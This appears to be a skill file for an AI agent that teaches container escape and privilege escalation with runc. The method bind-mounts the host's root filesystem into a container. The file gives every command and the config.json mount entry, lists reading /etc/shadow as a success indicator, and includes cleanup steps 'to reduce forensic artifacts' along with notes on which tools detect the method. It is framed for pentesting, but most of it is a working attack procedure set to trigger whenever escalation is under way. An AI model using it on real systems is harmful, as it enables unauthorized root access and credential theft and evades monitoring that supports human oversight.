---
name: runc-privilege-escalation
description: Privilege escalation technique using runc container runtime to mount the host's root filesystem. Use this skill whenever you're doing privilege escalation on a Linux system and runc is available, or when you need to escape a container to access the host filesystem, or when you're pentesting Docker/containerized environments and need to gain root access to the host.
---

# RunC Privilege Escalation

This skill helps you escalate privileges on Linux systems where `runc` (the OCI container runtime) is installed. The technique mounts the host's root filesystem into a container, giving you access to the entire host system.

## When to use this skill

- You're performing privilege escalation on a Linux system
- You've discovered `runc` is installed on the target
- You need to escape a container to access the host filesystem
- You're pentesting Docker or containerized environments
- You have limited shell access but need root-level file access

## Prerequisites

- `runc` must be installed on the target system
- You need write permissions in your current directory
- This typically requires root or a rootless runc configuration

## Quick Check

First, verify runc is available:

```bash
runc -help
```

If this returns help text, runc is installed and you can proceed.

## Step-by-Step Exploitation

### 1. Generate the container configuration

```bash
runc spec
```

This creates a `config.json` file in your current directory with default container settings.

### 2. Modify the mounts section

Edit `config.json` and add the following entry to the `mounts` array:

```json
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
}
```

**Why this works:** This bind mount maps the host's root filesystem (`/`) to the container's root (`/`), effectively giving you access to the entire host system from within the container.

### 3. Create the rootfs directory

```bash
mkdir rootfs
```

This directory is required by runc as the container's root filesystem.

### 4. Run the container

```bash
runc run demo
```

You'll now have a shell with access to the host's root filesystem. The files you see are the host's files.

## Important Considerations

### Rootless Configuration

By default, runc runs containers as root. If you're an unprivileged user:

- This technique **won't work** unless runc is configured for rootless operation
- Rootless containers have significant restrictions that don't apply to privileged containers
- Check if rootless mode is available: `runc --version` and review system configuration

### Detection

This technique may be detected by:
- File integrity monitoring (FIM) tools
- Container security solutions
- Audit logs (check `/var/log/audit/`)

### Cleanup

After you're done, clean up to reduce forensic artifacts:

```bash
runc delete demo
rm -rf config.json rootfs
```

## Alternative: Use the Helper Script

For faster execution, use the bundled script:

```bash
./scripts/setup-runc-escape.sh
```

This automates the config.json modification and setup process.

## Related Techniques

- Docker privilege escalation (if Docker is available instead)
- Container escape via shared namespaces
- Kernel exploit-based escapes

## Success Indicators

You've successfully escalated if:
- You can access `/etc/shadow` from the container
- You can read host user files in `/home/`
- You can execute commands as root on the host
- `id` shows you're running as root

## Troubleshooting

| Issue | Solution |
|-------|----------|
| `runc: command not found` | runc is not installed; try Docker escape instead |
| `permission denied` | You need root or rootless runc configuration |
| Container won't start | Check `config.json` syntax; ensure `rootfs` directory exists |
| Can't access host files | Verify the mount was added correctly to config.json |
